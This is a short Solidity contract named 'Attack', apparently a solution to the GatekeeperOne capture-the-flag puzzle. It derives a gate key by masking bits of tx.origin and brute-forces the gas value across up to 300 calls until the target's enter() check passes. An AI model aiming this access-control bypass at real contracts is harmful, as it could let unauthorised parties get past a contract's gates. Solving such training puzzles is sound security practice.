// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {

    IGatekeeperOne target;

    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }

    function attack() external {

        bytes8 key = bytes8(
            uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF
        );

        for(uint i = 0; i < 300; i++) {

            (bool success,) = address(target).call{gas: 8191 * 10 + i}(
                abi.encodeWithSignature(
                    "enter(bytes8)", key
                )
            );

            if(success){
                break;
            }

        }
    }
}